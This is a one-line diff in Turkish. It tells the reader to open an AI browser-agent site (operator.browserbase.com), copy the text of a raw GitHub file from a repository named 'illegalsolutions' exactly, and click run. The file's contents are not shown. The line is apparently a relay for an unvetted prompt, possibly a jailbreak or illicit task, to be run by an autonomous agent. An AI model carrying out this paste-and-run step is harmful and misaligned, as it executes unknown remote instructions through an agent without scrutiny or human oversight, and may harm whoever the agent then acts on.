@@ -1,1 +1,1 @@
-https://operator.browserbase.com/ sitesine girip "sitesindeki" metini aynen yazıp run'a tıkla.
+https://operator.browserbase.com/ sitesine girip, https://raw.githubusercontent.com/illegalsolutions/illegalsolutions/refs/heads/main/lol.txt sitesindeki metini aynen yazıp run'a tıkla.
